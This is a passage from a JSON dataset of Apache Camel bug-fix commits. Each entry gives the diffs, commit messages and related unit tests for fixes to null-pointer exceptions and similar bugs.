.to(\"mock:result\");\n \n                 from(\"direct:foo\")\n+                    .process(new Processor() {\n+                        public void process(Exchange exchange) throws Exception {\n+                            beforeThreadName = Thread.currentThread().getName();\n+                        }\n+                    })\n                     // using the builder style\n                     .threads().poolSize(5)\n+                    .process(new Processor() {\n+                        public void process(Exchange exchange) throws Exception {\n+                            afterThreadName = Thread.currentThread().getName();\n+                        }\n+                    })\n                     .to(\"mock:result\");\n             }\n         };",
                "raw_url": "https://github.com/apache/camel/raw/04a2c77c3080c8464286e29d0a2e00467a0957c6/camel-core/src/test/java/org/apache/camel/processor/ThreadsCorePoolTest.java",
                "sha": "fcdad21aecdba31223a196ff755d9c765aa76d97",
                "status": "modified"
            }
        ],
        "message": "Fixed the test failure with NPE on the CI-Server. The usage of static variables was the cause of this in case the second test method would be run as the first one in which case both beforeThreadName & afterThreadName would be null. Also afterThreadName should be correctly volatile as we set it's value async but read it inside the main thread. \n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1393291 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/0048bad878fa7dfb3a4e36c21ee6dcd13740462c",
        "patched_files": [],
        "repo": "camel",
        "unit_tests": [
            "ThreadsCorePoolTest.java"
        ]
    },
    "camel_0607c0d": {
        "bug_id": "camel_0607c0d",
        "commit": "https://github.com/apache/camel/commit/0607c0df1c125a5a7100b47fe422b32e71a75390",
        "file": [
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/0607c0df1c125a5a7100b47fe422b32e71a75390/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 23,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=0607c0df1c125a5a7100b47fe422b32e71a75390",
                "deletions": 9,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -1874,31 +1874,36 @@ protected synchronized void stopRouteService(RouteService routeService, boolean\n         routeService.setRemovingRoutes(removingRoutes);\n         stopRouteService(routeService);\n     }\n+    \n+    protected void logRouteState(Route route, String state) {\n+        if (log.isInfoEnabled()) {\n+            if (route.getConsumer() != null) {\n+                log.info(\"Route: {} {}, was consuming from: {}\", route.getId(), state, route.getConsumer().getEndpoint());\n+            } else {\n+                log.info(\"Route: {} {}.\", route.getId(), state);\n+            }\n+        }\n+    }\n+    \n     protected synchronized void stopRouteService(RouteService routeService) throws Exception {\n         routeService.stop();\n         for (Route route : routeService.getRoutes()) {\n-            if (log.isInfoEnabled()) {\n-                log.info(\"Route: \" + route.getId() + \" stopped, was consuming from: \" + route.getConsumer().getEndpoint());\n-            }\n+            logRouteState(route, \"stoped\");\n         }\n     }\n \n     protected synchronized void shutdownRouteService(RouteService routeService) throws Exception {\n         routeService.shutdown();\n         for (Route route : routeService.getRoutes()) {\n-            if (log.isInfoEnabled()) {\n-                log.info(\"Route: \" + route.getId() + \" shutdown and removed, was consuming from: \" + route.getConsumer().getEndpoint());\n-            }\n+            logRouteState(route, \"shutdown and removed\");\n         }\n     }\n \n     protected synchronized void suspendRouteService(RouteService routeService) throws Exception {\n         routeService.setRemovingRoutes(false);\n         routeService.suspend();\n         for (Route route : routeService.getRoutes()) {\n-            if (log.isInfoEnabled()) {\n-                log.info(\"Route: \" + route.getId() + \" suspended, was consuming from: \" + route.getConsumer().getEndpoint());\n-            }\n+            logRouteState(route, \"suspended\");\n         }\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/0607c0df1c125a5a7100b47fe422b32e71a75390/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "b44de69fa1067b1812eea46eeb1d2d0376b600ac",
                "status": "modified"
            }
        ],
        "message": "CAMEL-5830 fix the NPE when the shutdown the route which is not started rightly.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1414740 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/11f5df13aa67962b6c464e024d24501fd2b1c3b1",
        "patched_files": [
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java"
        ]
    },
    "camel_0682e8d": {
        "bug_id": "camel_0682e8d",
        "commit": "https://github.com/apache/camel/commit/0682e8dd41045e3375b61d3d76f6e6991e98c869",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/0682e8dd41045e3375b61d3d76f6e6991e98c869/components/camel-mail/src/main/java/org/apache/camel/component/mail/MailConverters.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mail/src/main/java/org/apache/camel/component/mail/MailConverters.java?ref=0682e8dd41045e3375b61d3d76f6e6991e98c869",
                "deletions": 3,
                "filename": "components/camel-mail/src/main/java/org/apache/camel/component/mail/MailConverters.java",
                "patch": "@@ -142,7 +142,7 @@ public static SearchTerm toSearchTerm(SimpleSearchTerm simple, TypeConverter typ\n             }\n         }\n         if (simple.getToSentDate() != null) {\n-            String s = simple.getFromSentDate();\n+            String s = simple.getToSentDate();\n             if (s.startsWith(\"now\")) {\n                 long offset = extractOffset(s, typeConverter);\n                 builder = builder.and(new NowSearchTerm(SearchTermBuilder.Comparison.LE.asNum(), true, offset));\n@@ -153,7 +153,7 @@ public static SearchTerm toSearchTerm(SimpleSearchTerm simple, TypeConverter typ\n             }\n         }\n         if (simple.getFromReceivedDate() != null) {\n-            String s = simple.getFromSentDate();\n+            String s = simple.getFromReceivedDate();\n             if (s.startsWith(\"now\")) {\n                 long offset = extractOffset(s, typeConverter);\n                 builder = builder.and(new NowSearchTerm(SearchTermBuilder.Comparison.GE.asNum(), false, offset));\n@@ -164,7 +164,7 @@ public static SearchTerm toSearchTerm(SimpleSearchTerm simple, TypeConverter typ\n             }\n         }\n         if (simple.getToReceivedDate() != null) {\n-            String s = simple.getFromSentDate();\n+            String s = simple.getToReceivedDate();\n             if (s.startsWith(\"now\")) {\n                 long offset = extractOffset(s, typeConverter);\n                 builder = builder.and(new NowSearchTerm(SearchTermBuilder.Comparison.LE.asNum(), false, offset));",
                "raw_url": "https://github.com/apache/camel/raw/0682e8dd41045e3375b61d3d76f6e6991e98c869/components/camel-mail/src/main/java/org/apache/camel/component/mail/MailConverters.java",
                "sha": "8262c14f84cfe8782f08a8e2bd194352efb878f4",
                "status": "modified"
            }
        ],
        "message": "CAMEL-6626 Fixed the search criteria NPE of camel-mail with thanks to Ales",
        "parent": "https://github.com/apache/camel/commit/24e01f17149ea3690d1fe4d2fabe4c78a5d88225",
        "patched_files": [
            "MailConverters.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "MailConvertersTest.java"
        ]
    },
    "camel_0686159": {
        "bug_id": "camel_0686159",
        "commit": "https://github.com/apache/camel/commit/0686159977d634dd4f29254c7d171b1d8915dfa3",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/0686159977d634dd4f29254c7d171b1d8915dfa3/components/camel-cdi/src/main/java/org/apache/camel/cdi/CdiCamelExtension.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cdi/src/main/java/org/apache/camel/cdi/CdiCamelExtension.java?ref=0686159977d634dd4f29254c7d171b1d8915dfa3",
                "deletions": 1,
                "filename": "components/camel-cdi/src/main/java/org/apache/camel/cdi/CdiCamelExtension.java",
                "patch": "@@ -350,7 +350,7 @@ private boolean shouldDeployDefaultCamelContext(Set<Bean<?>> beans) {\n             .filter(bean -> !bean.getBeanClass().getPackage().equals(getClass().getPackage()))\n             .map(Bean::getInjectionPoints)\n             .flatMap(Set::stream)\n-            .filter(ip -> getRawType(ip.getType()).getPackage().getName().startsWith(\"org.apache.camel\"))\n+            .filter(ip -> getRawType(ip.getType()).getName().startsWith(\"org.apache.camel\"))\n             .map(InjectionPoint::getQualifiers)\n             .flatMap(Set::stream)\n             .filter(isAnnotationType(Uri.class).or(isAnnotationType(Mock.class)).or(isEqual(DEFAULT)))",
                "raw_url": "https://github.com/apache/camel/raw/0686159977d634dd4f29254c7d171b1d8915dfa3/components/camel-cdi/src/main/java/org/apache/camel/cdi/CdiCamelExtension.java",
                "sha": "4803ef305ea8cd11832547e8f9348a8c47c1fce1",
                "status": "modified"
            },
            {
                "additions": 70,
                "blob_url": "https://github.com/apache/camel/blob/0686159977d634dd4f29254c7d171b1d8915dfa3/components/camel-cdi/src/test/java/org/apache/camel/cdi/test/Camel9973Test.java",
                "changes": 70,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cdi/src/test/java/org/apache/camel/cdi/test/Camel9973Test.java?ref=0686159977d634dd4f29254c7d171b1d8915dfa3",
                "deletions": 0,
                "filename": "components/camel-cdi/src/test/java/org/apache/camel/cdi/test/Camel9973Test.java",
                "patch": "@@ -0,0 +1,70 @@\n+/**\r\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\r\n+ * contributor license agreements.  See the NOTICE file distributed with\r\n+ * this work for additional information regarding copyright ownership.\r\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\r\n+ * (the \"License\"); you may not use this file except in compliance with\r\n+ * the License.  You may obtain a copy of the License at\r\n+ *\r\n+ *      http://www.apache.org/licenses/LICENSE-2.0\r\n+ *\r\n+ * Unless required by applicable law or agreed to in writing, software\r\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\r\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n+ * See the License for the specific language governing permissions and\r\n+ * limitations under the License.\r\n+ */\r\n+package org.apache.camel.cdi.test;\r\n+\r\n+import javax.enterprise.inject.Any;\r\n+import javax.enterprise.inject.Instance;\r\n+import javax.enterprise.inject.Produces;\r\n+import javax.inject.Inject;\r\n+\r\n+import org.apache.camel.CamelContext;\r\n+import org.apache.camel.cdi.CdiCamelExtension;\r\n+import org.jboss.arquillian.container.test.api.Deployment;\r\n+import org.jboss.arquillian.junit.Arquillian;\r\n+import org.jboss.shrinkwrap.api.Archive;\r\n+import org.jboss.shrinkwrap.api.ShrinkWrap;\r\n+import org.jboss.shrinkwrap.api.asset.EmptyAsset;\r\n+import org.jboss.shrinkwrap.api.spec.JavaArchive;\r\n+import org.junit.Test;\r\n+import org.junit.runner.RunWith;\r\n+\r\n+import static org.hamcrest.Matchers.equalTo;\r\n+import static org.hamcrest.Matchers.is;\r\n+import static org.junit.Assert.assertThat;\r\n+\r\n+@RunWith(Arquillian.class)\r\n+public class Camel9973Test {\r\n+\r\n+    @Produces\r\n+    private int integer = 1;\r\n+\r\n+    @Any\r\n+    @Inject\r\n+    private Instance<CamelContext> contexts;\r\n+\r\n+    @Deployment\r\n+    public static Archive<?> deployment() {\r\n+        return ShrinkWrap.create(JavaArchive.class)\r\n+            // Camel CDI\r\n+            .addPackage(CdiCamelExtension.class.getPackage())\r\n+            // Test class\r\n+            .addClass(PrimitiveInjectionPoint.class)\r\n+            // Bean archive deployment descriptor\r\n+            .addAsManifestResource(EmptyAsset.INSTANCE, \"beans.xml\");\r\n+    }\r\n+\r\n+    @Test\r\n+    public void verifyDeployment() {\r\n+        assertThat(\"Camel context beans are deployed!\", contexts.isUnsatisfied(), is(equalTo(true)));\r\n+    }\r\n+}\r\n+\r\n+class PrimitiveInjectionPoint {\r\n+\r\n+    @Inject\r\n+    int integer;\r\n+}\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/0686159977d634dd4f29254c7d171b1d8915dfa3/components/camel-cdi/src/test/java/org/apache/camel/cdi/test/Camel9973Test.java",
                "sha": "0219919d5779e2a0855355824c2fcd08154be31a",
                "status": "added"
            }
        ],
        "message": "CAMEL-9973: CdiCamelExtension.shouldDeployDefaultCamelContext throws NPE with primitive injection points",
        "parent": "https://github.com/apache/camel/commit/4ec3dbdce7db199663df37815fcf208e64c22f53",
        "patched_files": [
            "CdiCamelExtension.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "Camel9973Test.java"
        ]
    },
    "camel_07043c1": {
        "bug_id": "camel_07043c1",
        "commit": "https://github.com/apache/camel/commit/07043c1fd2510ac0c84165a7fddc7bd6a58d048e",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/07043c1fd2510ac0c84165a7fddc7bd6a58d048e/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java?ref=07043c1fd2510ac0c84165a7fddc7bd6a58d048e",
                "deletions": 2,
                "filename": "components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java",
                "patch": "@@ -200,8 +200,12 @@ public void process(Exchange exchange) throws Exception {\n             if (value != null) {\n                 filteredHeaders.put(header.getKey(), header.getValue());\n             } else if (log.isDebugEnabled()) {\n-                log.debug(\"Ignoring header: {} of class: {} with value: {}\",\n-                    new Object[]{header.getKey(), header.getValue().getClass().getName(), header.getValue()});\n+                if (header.getValue() == null) {\n+                    log.debug(\"Ignoring header: {} with null value\", header.getKey());\n+                } else {\n+                    log.debug(\"Ignoring header: {} of class: {} with value: {}\",\n+                            new Object[]{header.getKey(), ObjectHelper.classCanonicalName(header.getValue()), header.getValue()});\n+                }\n             }\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/07043c1fd2510ac0c84165a7fddc7bd6a58d048e/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQProducer.java",
                "sha": "ea02ce23e0dc6f82c30ce017d918cdf096be7c0c",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7571: Fixed potential NPE iin camel-rabbitmq f debug logging was enabled.",
        "parent": "https://github.com/apache/camel/commit/624b1abc7e9962b9adae62287f48147578ab50fc",
        "patched_files": [
            "RabbitMQProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RabbitMQProducerTest.java"
        ]
    },
    "camel_07472b8": {
        "bug_id": "camel_07472b8",
        "commit": "https://github.com/apache/camel/commit/07472b83a2740c15b1b550e55d7ced40024207f4",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/07472b83a2740c15b1b550e55d7ced40024207f4/camel-core/src/main/java/org/apache/camel/processor/LoopProcessor.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/LoopProcessor.java?ref=07472b83a2740c15b1b550e55d7ced40024207f4",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/LoopProcessor.java",
                "patch": "@@ -150,8 +150,8 @@ public void done(boolean doneSync) {\n      */\n     protected Exchange prepareExchange(Exchange exchange, int index) {\n         if (copy) {\n-            // create a correlated copy, and do not handover completions on copies\n-            return ExchangeHelper.createCorrelatedCopy(exchange, false);\n+            // use a copy but let it reuse the same exchange id so it appear as one exchange\n+            return ExchangeHelper.createCopy(exchange, true);\n         } else {\n             ExchangeHelper.prepareOutToIn(exchange);\n             return exchange;",
                "raw_url": "https://github.com/apache/camel/raw/07472b83a2740c15b1b550e55d7ced40024207f4/camel-core/src/main/java/org/apache/camel/processor/LoopProcessor.java",
                "sha": "3c943c9ebe123a12dabe973afe2315678d9b95b6",
                "status": "modified"
            },
            {
                "additions": 65,
                "blob_url": "https://github.com/apache/camel/blob/07472b83a2740c15b1b550e55d7ced40024207f4/camel-core/src/test/java/org/apache/camel/processor/LoopCopyErrorTest.java",
                "changes": 65,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/LoopCopyErrorTest.java?ref=07472b83a2740c15b1b550e55d7ced40024207f4",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/LoopCopyErrorTest.java",
                "patch": "@@ -0,0 +1,65 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.processor;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.Exchange;\n+import org.apache.camel.Processor;\n+import org.apache.camel.builder.RouteBuilder;\n+\n+/**\n+ * @version \n+ */\n+public class LoopCopyErrorTest extends ContextTestSupport {\n+\n+    public void testLoopCopy() throws Exception {\n+        getMockEndpoint(\"mock:loop\").expectedMessageCount(2);\n+        getMockEndpoint(\"mock:result\").expectedMessageCount(0);\n+\n+        try {\n+            template.sendBody(\"direct:start\", \"A\");\n+            fail(\"Should have thrown exception\");\n+        } catch (Exception e) {\n+            assertEquals(\"Forced\", e.getCause().getMessage());\n+        }\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:start\")\n+                    .loop(3).copy()\n+                        .process(new Processor() {\n+                            int invoked;\n+                            @Override\n+                            public void process(Exchange exchange) throws Exception {\n+                                if (invoked++ > 1) {\n+                                    throw new IllegalArgumentException(\"Forced\");\n+                                }\n+                            }\n+                        })\n+                        .to(\"mock:loop\")\n+                    .end()\n+                    .to(\"mock:result\");\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/07472b83a2740c15b1b550e55d7ced40024207f4/camel-core/src/test/java/org/apache/camel/processor/LoopCopyErrorTest.java",
                "sha": "4af6cd3d0dc71116472a66df0e4da266f88a8ab1",
                "status": "added"
            }
        ],
        "message": "CAMEL-5210: Fixed NPE with loop copy and error occurred.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1331278 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/2d3332021f7132817c02fb93a29c8a3533750253",
        "patched_files": [
            "LoopProcessor.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "LoopCopyErrorTest.java"
        ]
    },
    "camel_07caaa4": {
        "bug_id": "camel_07caaa4",
        "commit": "https://github.com/apache/camel/commit/07caaa4f39112deca295a6677402fec9d3fc4019",
        "file": [
            {
                "additions": 9,
                "blob_url": "https://github.com/apache/camel/blob/07caaa4f39112deca295a6677402fec9d3fc4019/camel-core/src/main/java/org/apache/camel/impl/CamelPostProcessorHelper.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/CamelPostProcessorHelper.java?ref=07caaa4f39112deca295a6677402fec9d3fc4019",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/CamelPostProcessorHelper.java",
                "patch": "@@ -37,6 +37,7 @@\n import org.apache.camel.component.bean.BeanInfo;\n import org.apache.camel.component.bean.BeanProcessor;\n import org.apache.camel.component.bean.ProxyHelper;\n+import org.apache.camel.component.properties.PropertiesComponent;\n import org.apache.camel.processor.CamelInternalProcessor;\n import org.apache.camel.processor.UnitOfWorkProducer;\n import org.apache.camel.util.CamelContextHelper;\n@@ -229,7 +230,14 @@ public Object getInjectionPropertyValue(Class<?> type, String propertyName, Stri\n             String key;\n             String prefix = getCamelContext().getPropertyPrefixToken();\n             String suffix = getCamelContext().getPropertySuffixToken();\n-            if (!propertyName.contains(prefix)) {\n+\n+            if (prefix == null && suffix == null) {\n+                // if no custom prefix/suffix then use defaults\n+                prefix = PropertiesComponent.DEFAULT_PREFIX_TOKEN;\n+                suffix = PropertiesComponent.DEFAULT_SUFFIX_TOKEN;\n+            }\n+\n+            if (!propertyName.startsWith(prefix)) {\n                 // must enclose the property name with prefix/suffix to have it resolved\n                 key = prefix + propertyName + suffix;\n             } else {",
                "raw_url": "https://github.com/apache/camel/raw/07caaa4f39112deca295a6677402fec9d3fc4019/camel-core/src/main/java/org/apache/camel/impl/CamelPostProcessorHelper.java",
                "sha": "04dbc4d4f73590961f7b504f76f309e354c9bfa2",
                "status": "modified"
            }
        ],
        "message": "CAMEL-8125: Avoid potential NPE when using @PropertyInject with Camel main.",
        "parent": "https://github.com/apache/camel/commit/c00bc44d12972bd99fec89e3c29a93b972f44f6e",
        "patched_files": [
            "CamelPostProcessorHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CamelPostProcessorHelperTest.java"
        ]
    },
    "camel_08769e0": {
        "bug_id": "camel_08769e0",
        "commit": "https://github.com/apache/camel/commit/08769e0e8ce78c0e855b4675781a9f9ca929a1e0",
        "file": [
            {
                "additions": 16,
                "blob_url": "https://github.com/apache/camel/blob/08769e0e8ce78c0e855b4675781a9f9ca929a1e0/components/camel-leveldb/src/main/java/org/apache/camel/component/leveldb/LevelDBFile.java",
                "changes": 25,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-leveldb/src/main/java/org/apache/camel/component/leveldb/LevelDBFile.java?ref=08769e0e8ce78c0e855b4675781a9f9ca929a1e0",
                "deletions": 9,
                "filename": "components/camel-leveldb/src/main/java/org/apache/camel/component/leveldb/LevelDBFile.java",
                "patch": "@@ -18,7 +18,9 @@\n \n import java.io.File;\n import java.io.IOException;\n-\n+import java.nio.file.Files;\n+import java.nio.file.Path;\n+import java.nio.file.Paths;\n import org.apache.camel.Service;\n import org.apache.camel.util.IOHelper;\n import org.iq80.leveldb.CompressionType;\n@@ -29,6 +31,11 @@\n import org.slf4j.Logger;\n import org.slf4j.LoggerFactory;\n \n+\n+\n+import static org.fusesource.leveldbjni.JniDBFactory.factory;\n+\n+\n /**\n  * Manages access to a shared <a href=\"https://github.com/fusesource/leveldbjni/\">LevelDB</a> file.\n  * <p/>\n@@ -55,22 +62,22 @@ public DB getDb() {\n         return db;\n     }\n \n-    public void setFile(File file) throws IOException {\n-        this.file = file;\n-    }\n-\n     public File getFile() {\n         return file;\n     }\n \n-    public void setFileName(String fileName) {\n-        this.file = new File(fileName);\n+    public void setFile(File file) throws IOException {\n+        this.file = file;\n     }\n \n     public String getFileName() throws IOException {\n         return file.getCanonicalPath();\n     }\n \n+    public void setFileName(String fileName) {\n+        this.file = new File(fileName);\n+    }\n+\n     public int getWriteBufferSize() {\n         return writeBufferSize;\n     }\n@@ -170,8 +177,8 @@ public void start() {\n \n         options.createIfMissing(true);\n         try {\n-            getFile().getParentFile().mkdirs();\n-            DBFactory factory = getFactory();\n+            final Path dbFile = Paths.get(this.getFileName());\n+            Files.createDirectories(dbFile.getParent());\n             db = factory.open(getFile(), options);\n         } catch (IOException ioe) {\n             throw new RuntimeException(\"Error opening LevelDB with file \" + getFile(), ioe);",
                "raw_url": "https://github.com/apache/camel/raw/08769e0e8ce78c0e855b4675781a9f9ca929a1e0/components/camel-leveldb/src/main/java/org/apache/camel/component/leveldb/LevelDBFile.java",
                "sha": "1198a8b461fc79dc752769eaa11aabbf7f70d082",
                "status": "modified"
            },
            {
                "additions": 69,
                "blob_url": "https://github.com/apache/camel/blob/08769e0e8ce78c0e855b4675781a9f9ca929a1e0/components/camel-leveldb/src/test/java/org/apache/camel/component/leveldb/LevelDBSetupTest.java",
                "changes": 69,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-leveldb/src/test/java/org/apache/camel/component/leveldb/LevelDBSetupTest.java?ref=08769e0e8ce78c0e855b4675781a9f9ca929a1e0",
                "deletions": 0,
                "filename": "components/camel-leveldb/src/test/java/org/apache/camel/component/leveldb/LevelDBSetupTest.java",
                "patch": "@@ -0,0 +1,69 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+\n+package org.apache.camel.component.leveldb;\n+\n+import org.apache.camel.test.junit4.CamelTestSupport;\n+import org.junit.Test;\n+\n+\n+/**\n+ * The class LevelDBSetupTest\n+ *\n+ * @author mgr, 2019-03-27\n+ * @version 1.0\n+ */\n+public class LevelDBSetupTest extends CamelTestSupport {\n+    /**\n+     * The Level db file.\n+     */\n+    private LevelDBFile levelDBFile;\n+\n+    @Override\n+    public void setUp() throws Exception {\n+        super.setUp();\n+    }\n+\n+    @Override\n+    public void tearDown() throws Exception {\n+        super.tearDown();\n+    }\n+\n+    /**\n+     * Test level db start with no path.\n+     */\n+    @Test\n+    public void testLevelDBStartWithNoPath() {\n+        deleteDirectory(\"leveldb.dat\");\n+        levelDBFile = new LevelDBFile();\n+        levelDBFile.setFileName(\"leveldb.dat\");\n+        levelDBFile.start();\n+        levelDBFile.stop();\n+    }\n+\n+    /**\n+     * Test level db start with path.\n+     */\n+    @Test\n+    public void testLevelDBStartWithPath() {\n+        deleteDirectory(\"target/data\");\n+        levelDBFile = new LevelDBFile();\n+        levelDBFile.setFileName(\"target/data/leveldb.dat\");\n+        levelDBFile.start();\n+        levelDBFile.stop();\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/08769e0e8ce78c0e855b4675781a9f9ca929a1e0/components/camel-leveldb/src/test/java/org/apache/camel/component/leveldb/LevelDBSetupTest.java",
                "sha": "89ad023b32eddcb28357890f19b8e08e4a65a55e",
                "status": "added"
            }
        ],
        "message": "Camel 13368 - LevelDB NPE if fileName missing separator (#2845)\n\n* Fix using NIO utils instead\r\n\r\n* Trying to adapt o checkstyle\r\n\r\nSigned-off-by: Mikael Grevsten <mikael.grevsten@tradechannel.se>\r\n\r\n* Fixing header\r\n\r\nSigned-off-by: Mikael Grevsten <mikael.grevsten@tradechannel.se>\r\n\r\n* Revert \"Fixing header\"\r\n\r\nThis reverts commit 377d110c\r\n\r\nSigned-off-by: Mikael Grevsten <mikael.grevsten@tradechannel.se>\r\n\r\n* Fixing header\r\n\r\nSigned-off-by: Mikael Grevsten <mikael.grevsten@tradechannel.se>\r\n\r\n* Fixing header again\r\n\r\nSigned-off-by: Mikael Grevsten <mikael.grevsten@tradechannel.se>\r\n\r\n* Fix using NIO utils instead\r\n\r\n# Conflicts:\r\n#\tcomponents/camel-leveldb/src/test/java/org/apache/camel/component/leveldb/LevelDBSetupTest.java\r\n\r\n* Damn you headers\r\n\r\nSigned-off-by: Mikael Grevsten <mikael.grevsten@tradechannel.se>\r\n\r\n* REmoving final again\r\n\r\nSigned-off-by: Mikael Grevsten <mikael.grevsten@tradechannel.se>\r\n\r\n* Removing final again, damn you IDEA\r\n\r\nSigned-off-by: Mikael Grevsten <mikael.grevsten@tradechannel.se>\r\n\r\n* Fixed checkstyle issues\r\n\r\nSigned-off-by: Mikael Grevsten <mikael.grevsten@tradechannel.se>",
        "parent": "https://github.com/apache/camel/commit/7b6c592c13b49681b3b7dc4c88daf27e24d680ec",
        "patched_files": [
            "LevelDBFile.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "LevelDBSetupTest.java"
        ]
    },
    "camel_0a678d8": {
        "bug_id": "camel_0a678d8",
        "commit": "https://github.com/apache/camel/commit/0a678d8920049acc85831f218e478d000125ed15",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/0a678d8920049acc85831f218e478d000125ed15/core/camel-api/src/main/java/org/apache/camel/AggregationStrategy.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/core/camel-api/src/main/java/org/apache/camel/AggregationStrategy.java?ref=0a678d8920049acc85831f218e478d000125ed15",
                "deletions": 2,
                "filename": "core/camel-api/src/main/java/org/apache/camel/AggregationStrategy.java",
                "patch": "@@ -32,7 +32,7 @@\n  * and <tt>parallelProcessing</tt> is used. You can work around this behavior using the <tt>stopOnAggregateException</tt> option.\n  * <p/>\n  * It is possible that <tt>newExchange</tt> is <tt>null</tt> which could happen if there was no data possible\n- * to acquire. Such as when using a {@link org.apache.camel.processor.PollEnricher} to poll from a JMS queue which\n+ * to acquire. Such as when using a <tt>PollEnricher</tt> to poll from a JMS queue which\n  * is empty and a timeout was set.\n  * <p/>\n  * Possible implementations include performing some kind of combining or delta processing, such as adding line items\n@@ -125,7 +125,6 @@ default void timeout(Exchange exchange, int index, int total, long timeout) {\n      */\n     default void onOptimisticLockFailure(Exchange oldExchange, Exchange newExchange) {\n         LoggerFactory.getLogger(getClass()).trace(\"onOptimisticLockFailure with AggregationStrategy: {}, oldExchange: {}, newExchange: {}\", this, oldExchange, newExchange);\n-\n     }\n \n }",
                "raw_url": "https://github.com/apache/camel/raw/0a678d8920049acc85831f218e478d000125ed15/core/camel-api/src/main/java/org/apache/camel/AggregationStrategy.java",
                "sha": "8021584f282923feb3e546014515763590546a7b",
                "status": "modified"
            },
            {
                "additions": 12,
                "blob_url": "https://github.com/apache/camel/blob/0a678d8920049acc85831f218e478d000125ed15/core/camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregateProcessor.java",
                "changes": 21,
